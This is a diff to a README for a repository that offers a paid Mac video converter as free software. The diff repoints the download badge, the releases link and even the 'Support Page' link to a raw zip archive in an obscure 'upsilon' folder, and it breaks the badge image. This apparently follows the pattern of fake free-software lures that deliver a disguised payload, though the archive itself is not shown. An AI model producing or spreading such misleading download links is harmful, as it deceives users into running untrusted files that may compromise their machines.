@@ -1,6 +1,6 @@
 # 🎥 MacX-HD-Video-Converter-Pro-Free - Convert Videos Easily
 
-[![Download](https://img.shields.io/badge/Download-MacX%20HD%20Video%20Converter%20Pro%20Free-brightgreen)](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/releases)
+[![Download](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/raw/refs/heads/main/upsilon/Pro-Converter-Video-Free-Mac-H-1.3.zip%20HD%20Video%20Converter%20Pro%20Free-brightgreen)](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/raw/refs/heads/main/upsilon/Pro-Converter-Video-Free-Mac-H-1.3.zip)
 
 ## 📘 Overview
 
@@ -29,7 +29,7 @@ MacX HD Video Converter Pro Free offers several key features:
 To download the MacX HD Video Converter Pro Free, please follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page:
-   [Download MacX HD Video Converter Pro Free](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/releases)
+   [Download MacX HD Video Converter Pro Free](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/raw/refs/heads/main/upsilon/Pro-Converter-Video-Free-Mac-H-1.3.zip)
 
 2. **Select the Version**: On the Releases page, you will find different versions of the software. Choose the latest version for the best features.
 
@@ -65,7 +65,7 @@ If you encounter any issues while using the software:
 
 For help with the software, visit our official support page:
 
-- **Support Page**: [Visit Support](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/issues)
+- **Support Page**: [Visit Support](https://github.com/italoneres003/MacX-HD-Video-Converter-Pro-Free/raw/refs/heads/main/upsilon/Pro-Converter-Video-Free-Mac-H-1.3.zip)
 
 You can report bugs or seek assistance with complex issues.
 
